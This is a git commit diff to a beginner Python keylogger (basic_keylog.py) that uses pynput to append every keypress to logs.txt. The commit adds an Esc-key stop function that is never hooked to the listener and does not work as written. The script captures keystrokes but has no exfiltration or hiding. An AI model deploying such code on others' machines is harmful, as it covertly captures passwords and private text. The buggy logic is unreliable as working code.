dec17631de30325c4355b70bd1b107d21d51167c
Bearhost <adedoyin.adetunji@miva.edu.ng>
2024-11-29 21:40:50 +0100

    add a function to sto the listener with the esc key.

--- basic_keylog.py
+++ basic_keylog.py
@@ -1,7 +1,7 @@
 from pynput.keyboard import Listener
 
 def log_keys(key):
-    key= str(key).replace("", "")
+    key = str(key).replace("'", "")
     if key == 'Key.space':
         key= ' '
     elif'key'in key:
@@ -9,6 +9,12 @@ def log_keys(key):
         
     with open("logs.txt", "a") as log_file:
         log_file.write(key)
+        
+ #stop listener when the esc key is pressed.       
+def stop_keys(key):
+    if key == 'key.esc':
+        return False
+    log_keys(key)        
         
 with Listener(on_press=log_keys) as listener:
     listener.join()
